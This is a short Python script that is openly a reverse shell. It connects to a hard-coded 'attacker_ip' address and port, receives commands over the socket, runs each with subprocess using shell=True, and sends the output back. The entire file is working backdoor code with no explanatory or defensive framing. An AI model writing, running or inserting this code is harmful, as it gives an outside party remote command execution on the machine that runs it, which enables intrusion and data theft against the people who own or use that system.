import socket
import subprocess

attacker_ip = '192.168.1.243'
attacker_port = 6996

def get_command():
    while True:
        command = sock.recv(2048)
        command = command.decode()
        if command == 'q':
            break
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            sock.send(result)

def connect_to_attacker():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((attacker_ip, attacker_port))

if __name__ == "__main__":
    connect_to_attacker()
    get_command()
    sock.close()
